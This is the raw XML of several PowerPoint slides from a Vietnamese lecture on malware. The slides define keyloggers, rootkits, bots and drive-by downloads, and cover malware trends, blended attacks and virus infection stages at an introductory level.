                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> client): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>các chương trình được sử dụng để gửi một khối lượng lớn e-mail không mong muốn hoặc để tấn công các hệ thống có lưu lượng lớn để thực hiện tấn công DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Keyloggers: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chụp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động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bàn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phím</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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trên một hệ thống bị xâm nhập</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Rootkit: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tập hợp các công cụ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>được</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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sử dụng sau khi đã đột nhập vào một hệ thống máy tính và truy cập root-level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Zombie (bot): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chương trình trên máy tính </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>được</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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kích hoạt để khởi động các cuộc tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> các máy khác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Drive-by-download: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tấn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công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dụng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mã</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trên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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>có</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điểm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yếu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khai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lỗ</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hổng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trình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duyệt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hoặc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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> client </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khi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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> web đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc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xem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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1702502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a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Xu thế phát triển</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Xu thế phát triển của mã độc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mã độc ngày càng phức tạp, tinh vi, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>pha trộn kết hợp nhiều cơ chế lan truyền </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>và các hoạt động thực hiện trên mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>phần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> cứng, phần sụn, mã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Store</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhiều</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tảng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lừa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ko</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>tống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tiền</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mục tiêu kinh tế, tài chính, chính trị </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Vũ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>khí</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tranh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>tình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> báo mạng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Blended attack:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Một cuộc tấn công hỗn hợp sử dụng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>nhiều phương pháp lây nhiễm lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>, để tối đa hoá tốc độ lây nhiễm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>và mức độ nghiêm trọng của vụ tấn công. Một số phần mềm độc hại thậm chí còn hỗ trợ một cơ chế cập nhật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>cho phép nó thay đổi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>vùng lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t> truyền và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>hoạt động một khi mã độc đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ợc triển khai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="365837723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idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1676400"/>
            <a:ext cx="7458075" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>VIRUS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Là phần mềm lây nhiễm trên các chương trình</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sửa đổi ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ương trình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>và thêm vào bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> sao của chính nó</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thực hiện bí mật khi chương trình đang chạy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Machine code lây nhiễm lên các executable content, interpreted content, boot record  (các tiện ích, ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình hệ thống, ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình ứng dụng)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Scriting code lây nhiễm lên các active content (Word, Excel, Adobe PDF…)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đặc trưng với hệ điều hành và phần cứng </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E8DA6E1-BDCE-4434-BC08-3D58B9B8DB3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{732A14A3-69C3-4AB0-9C3C-A1890FF5072C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7839075" y="1456582"/>
            <a:ext cx="4352925" cy="2695575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="375410410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idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1447800"/>
            <a:ext cx="8915400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="349250" lvl="2" indent="-342900" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một virus điển hình hoạt động qua các giai đoạn:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="2" indent="-342900" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="2" name="Diagram 1"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1679211799"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1330036" y="1945178"/>
          <a:ext cx="10861964" cy="491282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itle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3F3F221-5111-49BD-B81E-2231F80AA756}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
